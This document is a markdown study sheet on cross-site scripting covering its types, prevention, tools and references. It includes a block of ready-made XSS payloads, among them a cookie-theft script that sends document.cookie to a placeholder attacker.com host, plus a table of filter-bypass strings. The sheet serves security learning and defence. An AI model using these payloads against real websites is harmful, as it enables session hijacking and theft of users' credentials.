# Cross-Site Scripting (XSS)

## What is XSS?

XSS allows attackers to inject malicious client-side scripts into web pages viewed by other users. The browser executes the script in the context of the vulnerable site, giving the attacker access to cookies, session tokens, and DOM content.

---

## Types of XSS

### 1. Reflected XSS
- Payload is in the request (URL param, form input) and reflected back in the response.
- Not stored — victim must click a crafted link.
- **Example:** `https://example.com/search?q=<script>alert(1)</script>`

### 2. Stored XSS
- Payload is saved in the database (e.g., comment, username, profile bio).
- Executes every time any user views the affected page.
- More dangerous than reflected — no need to trick victim into clicking a link.

### 3. DOM-Based XSS
- Vulnerability exists in client-side JavaScript, not the server.
- The payload never reaches the server — it's injected into the DOM directly.
- **Example:** Unsafe use of `document.location`, `innerHTML`, `eval()`.

---

## Common Payloads

```html
<!-- Basic alert -->
<script>alert(1)</script>

<!-- Cookie theft -->
<script>document.location='http://attacker.com/?c='+document.cookie</script>

<!-- Image onerror -->
<img src=x onerror=alert(1)>

<!-- SVG -->
<svg onload=alert(1)>

<!-- Input tag -->
<input autofocus onfocus=alert(1)>

<!-- Bypass filters (no spaces) -->
<script>alert`1`</script>
```

---

## Filter Bypass Techniques

| Technique | Example |
|---|---|
| Case variation | `<ScRiPt>alert(1)</ScRiPt>` |
| HTML encoding | `&lt;script&gt;` (won't work if rendered) |
| Double encoding | `%253Cscript%253E` |
| JavaScript events | `onerror`, `onload`, `onfocus`, `onmouseover` |
| Tag breaking | `<scr<script>ipt>alert(1)</sc</script>ript>` |
| Null bytes | `<scri\x00pt>` |

---

## XSS via Different Contexts

| Context | Notes |
|---|---|
| HTML body | `<script>`, event handlers |
| HTML attribute | `" onmouseover="alert(1)` |
| JavaScript string | `'; alert(1); //` |
| URL | `javascript:alert(1)` |
| CSS | `expression(alert(1))` (IE only) |

---

## Impact

- Session hijacking (steal cookies)
- Credential harvesting (fake login forms)
- Keylogging
- Defacement
- Redirect victims to malicious sites
- CSRF token theft (leading to account takeover)

---

## Prevention

- **Output encoding** — encode user input before rendering (HTML, JS, URL context-aware)
- **Content Security Policy (CSP)** — restrict script sources
- **HttpOnly cookies** — prevent JS from reading cookies
- **Input validation** — allowlist expected input formats
- **Use secure frameworks** — React, Angular escape output by default
- Avoid dangerous sinks: `innerHTML`, `document.write()`, `eval()`

---

## Tools

- Burp Suite (Scanner + Repeater)
- XSStrike
- DalFox
- Browser DevTools

---

## References

- [OWASP XSS](https://owasp.org/www-community/attacks/xss/)
- [PortSwigger XSS Labs](https://portswigger.net/web-security/cross-site-scripting)
- [PayloadsAllTheThings - XSS](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection)
